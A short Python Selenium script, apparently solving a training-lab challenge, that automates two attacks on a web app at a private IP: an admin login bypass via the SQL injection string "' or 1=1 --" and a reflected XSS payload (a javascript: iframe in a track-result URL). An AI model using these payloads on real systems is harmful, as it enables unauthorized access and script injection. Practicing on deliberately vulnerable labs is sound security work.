from selenium import webdriver
from time import sleep
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains

def get_browser():
    return webdriver.Chrome()

def closing_welcome_button(browser):
    closing_welcome_button = browser.find_element(By.CSS_SELECTOR, "button[aria-label='Close Welcome Banner']")
    action = ActionChains(browser)
    action.click(on_element = closing_welcome_button)
    action.perform()

def login_as_admin(browser):
    email = "' or 1=1 --"
    password = 'anything'

    input_email = browser.find_element(By.ID, 'email')
    input_password = browser.find_element(By.ID, 'password')
    login_btn = browser.find_element(By.ID, 'loginButton')

    actions = ActionChains(browser)
    actions.send_keys_to_element(input_email, email)
    actions.send_keys_to_element(input_password, password)
    actions.click(login_btn)
    actions.perform()
    sleep(3)
    

def reflected_xss(browser, url):
    print('Popping reflected XSS in browser...')
    browser.get(url)
    sleep(3)
    closing_welcome_button(browser)
    login_as_admin(browser)

    #slove the XSS challenge
    xss_url = 'http://192.168.55.132:3000/#/track-result?id=<iframe%20src%3D"javascript:alert(%60xss%60)">'
    browser.get(xss_url)
    sleep(5)

url = 'http://192.168.55.132:3000/#/login'
reflected_xss(get_browser(), url)
